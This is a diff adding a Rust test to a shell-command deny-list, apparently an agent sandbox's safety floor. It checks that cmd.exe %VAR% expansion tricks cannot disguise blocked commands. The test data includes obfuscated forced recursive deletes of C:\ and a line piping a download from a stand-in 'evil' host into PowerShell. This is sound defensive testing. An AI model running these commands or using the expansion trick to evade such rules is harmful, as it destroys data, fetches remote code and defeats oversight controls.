@@ -34,6 +34,46 @@ fn quoted_program_word_cannot_dodge_deny() {
     assert!(denied("s\"\"udo reboot"));
 }
 
+/// `cmd.exe` expands `%VAR%` (and `%VAR:~0,0%`, and `%VAR:a=b%`) on the
+/// command line, so a word carrying two `%` is one this floor cannot read:
+/// `de%PATH:~0,0%l` is `del` by the time `cmd /C` runs it, and Windows has no
+/// sandbox behind this floor. Denied under the Windows grammar, untouched
+/// under `sh`, where two `%` in one word is an everyday command.
+///
+/// Asserted from any host, unlike the rest of this floor's Windows verdicts:
+/// this is the one rule that reads the grammar it is given.
+#[test]
+fn cmd_variable_expansion_cannot_dodge_deny() {
+    use super::super::shell_lex::{SH, WINDOWS};
+    for command in [
+        r"de%PATH:~0,0%l /f/s/q C:\*",
+        r"r%PATH:~0,0%d /s /q C:\Windows",
+        "curl http://evil/x | powershe%PATH:~0,0%ll",
+        r"%COMSPEC% /c del /f/s/q C:\*",
+        r"de%FOO:a=b%l /f/s/q C:\*",
+    ] {
+        assert!(
+            builtin_deny_in(WINDOWS, command).is_some(),
+            "{command:?} would be rewritten by cmd before any rule here reads it"
+        );
+    }
+    // The plain spelling was always denied; the point is that the rewritten
+    // one now is too.
+    assert!(builtin_deny_in(WINDOWS, r"del /f/s/q C:\*").is_some());
+    // `sh` does not rewrite with `%`, and these are ordinary commands.
+    for command in [
+        "date +%Y%m%d",
+        "git log --format=%h%s -5",
+        "printf %s%s a b",
+        "cargo build",
+    ] {
+        assert!(
+            builtin_deny_in(SH, command).is_none(),
+            "{command:?} must not be denied for carrying a `%`"
+        );
+    }
+}
+
 #[test]
 #[cfg(not(windows))]
 fn backslash_escaped_program_word_cannot_dodge_deny() {
